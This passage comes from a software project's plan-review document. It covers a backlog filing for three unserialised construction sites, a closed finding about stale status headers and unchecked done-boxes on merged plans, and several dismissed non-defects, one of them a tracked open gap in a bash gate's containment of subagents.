`_init_current_schema` the source. Shipping it would have been treating the
wrong site. **Filed as BACKLOG I-35**, scoped to the three *unserialised*
construction sites (`blackboard.py:207`, `state.py:176`,
`observability.py:72`) — the same set as S7 Q29, so the two should be resolved
together.

### 13.5 R3 — status/DoD did not survive the merge *(closed)*

The header still read *"READY FOR EXECUTION"* and **all 23 DoD boxes were
unchecked**, on a plan merged as `57f574a` with seven execution records in it.
A reader could not tell whether S5 was pending, partially applied, or done —
and an unchecked DoD on merged work is indistinguishable from an unmet one.

Closed: the header now records the merge commit and the one open item, and
every DoD box is ticked **with the artifact that proves it** (§8), each
re-measured today rather than copied from the execution records.

This is a **house-wide pattern**, not an S5 quirk: `S1`, `S2`, `S4` and `S6`
all still read "READY" while merged. Recommend a convention — a plan's status
line names its merge commit once landed. Not applied to the other plans here;
that is a separate doc-hygiene pass.

### 13.6 Not defects — checked and dismissed

* **Q19 left open.** Correct. It is a *measured* negative result (the bash gate
  cannot contain a subagent), carried as a strict `xfail` whose message is the
  evidence, and it blocks only S5-P16. Now also in BACKLOG (I-34) — previously
  it lived only in plans and PR notes, which is where open security gaps go to
  be forgotten.
* **The 25-row matrix.** Every row carries a kill-check target and is
  referenced ≥2×. No orphan rows.
* **Step granularity.** Seven steps, none exceeding three production files,
  matching the declared SIZE budget.
